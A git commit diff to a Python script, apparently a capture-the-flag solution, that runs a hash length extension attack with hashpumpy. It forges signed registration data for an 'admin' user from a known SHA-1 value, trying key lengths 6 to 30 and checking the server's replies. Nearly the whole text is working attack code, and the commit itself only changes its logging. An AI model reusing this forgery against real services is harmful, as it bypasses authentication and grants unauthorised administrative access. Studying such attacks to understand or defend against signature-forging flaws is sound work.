1f5966ca85817e555e8c926a32e0f63a5da7caea
Laurent Fabre <lf@macbook-pro-de-laurent.home>
2020-11-25 06:03:13 +0100

    commit

--- stickitup.py
+++ stickitup.py
@@ -23,35 +23,34 @@ def main():
     # admi / '4dd28ad0560441245de6fda3973890eeb41b702d' / variable key length
     results = []
     for i in range(6, 30):
-        data = hashpumpy.hashpump('4dd28ad0560441245de6fda3973890eeb41b702d', "admi", 'n', i)
+        data = list(hashpumpy.hashpump('4dd28ad0560441245de6fda3973890eeb41b702d', "admi", 'n', i))
+        data.append(i)
         results.append(data)
 
-    j = 6
     for r in results:
         register_user = urllib.parse.quote_from_bytes(r[1])
-        print("{} => {}".format(r[0], register_user))
+        print("[{}] {} => {}".format(r[2], r[0], register_user))
         print(register_user)
         status, data = stick_member(register_user, '5b18c8fd186116e2c474fd89e68b3f46f402e563', prefix='admi')
 
-        print("Code: {}".format(status))
+        print("[{}] Code: {}".format(r[2], status))
         if status == 200:
             resp = data.getvalue().decode()
             if resp.find('Missing') > 0:
-                print("[{}] KO: Missing fields".format(j))
+                print("[{}] KO: Missing fields".format(r[2]))
                 break 
             elif resp.find('Invalid') > 0: 
-                print("[{}] KO: Invalid fields".format(j))
+                print("[{}] KO: Invalid fields".format(r[2]))
                 break
             elif resp.find('User exist') > 0:
-                print("[{}] KO: User exist, try with another email".format(j))
+                print("[{}] KO: User exist, try with another email".format(r[2]))
                 break
             elif resp.find('Registered !') > 0:
-                print("[{}] OK: Registered".format(j))
+                print("[{}] OK: Registered".format(r[2]))
             elif resp.find('email or password empty'):
-                print("[{}] KO: Hash doesn't work".format(j))
+                print("[{}] KO: Hash doesn't work".format(r[2]))
             else:
                 print(resp)
-        j+=1
 
 if __name__ == "__main__":
     main()
